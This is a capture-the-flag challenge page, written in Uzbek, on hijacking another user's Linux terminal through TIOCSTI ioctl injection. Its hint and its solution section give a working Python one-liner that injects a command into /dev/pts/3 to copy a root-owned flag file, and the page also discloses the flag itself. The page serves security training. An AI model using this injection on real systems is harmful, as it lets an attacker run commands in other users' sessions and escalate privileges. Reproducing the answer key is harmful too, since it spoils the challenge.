---
id: 30
title: "CH30: Custom Linux Pseudo-Terminal (PTY) Hijacking"
module: "Modul 3: Streams, FIFO & Sockets"
difficulty: Hard
points: 10
tags: ['pty', 'ioctl', 'tiocsti', 'terminal-hijack']
flag: "HD{pty_tiocsti_terminal_injection_root_930}"
---

# 🎯 Topshiriq #30: CH30: Custom Linux Pseudo-Terminal (PTY) Hijacking

## 📌 Metama'lumotlar:
* **Modul:** `Modul 3: Streams, FIFO & Sockets`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 10 ball`
* **Teglar:** #pty, #ioctl, #tiocsti, #terminal-hijack

---

## 📝 Topshiriq Senariysi (Scenario):
/dev/pts/3 terminalida boshqa foydalanuvchi buyruq kiritmoqda. `TIOCSTI` ioctl injection orqali uning terminaliga buyruq yuborib, flagni o'z papkangizga nusxalang.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> python3 -c 'import fcntl, termios; [fcntl.ioctl(open("/dev/pts/3","w"), termios.TIOCSTI, c) for c in "cat /root/flag.txt > /tmp/flag\n"]'

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
python3 -c 'import fcntl, termios; [fcntl.ioctl(open("/dev/pts/3","w"), termios.TIOCSTI, c) for c in "cat /root/flag.txt > /tmp/flag\n"]'
```

---

## 🚩 Maxfiy Flag:
`HD{pty_tiocsti_terminal_injection_root_930}`
